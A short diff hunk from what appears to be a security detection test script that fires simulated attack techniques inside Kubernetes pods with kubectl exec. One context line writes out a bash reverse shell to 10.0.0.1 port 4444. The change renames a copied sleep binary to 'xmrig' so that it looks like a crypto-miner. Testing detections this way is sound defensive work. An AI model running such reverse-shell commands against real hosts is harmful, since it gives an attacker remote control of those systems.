@@ -79,7 +79,7 @@ except: pass' >/dev/null 2>&1 || true ;;
                'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' \
                >/dev/null 2>&1 || true ;;
     RTM-008) kubectl exec -n "${NS}" "${pod}" -- sh -c \
-               'cp /bin/sleep /tmp/xmrig2 && /tmp/xmrig2 1' >/dev/null 2>&1 || true ;;
+               'cp /bin/sleep /tmp/xmrig && /tmp/xmrig 1' >/dev/null 2>&1 || true ;;
   esac
 }
 
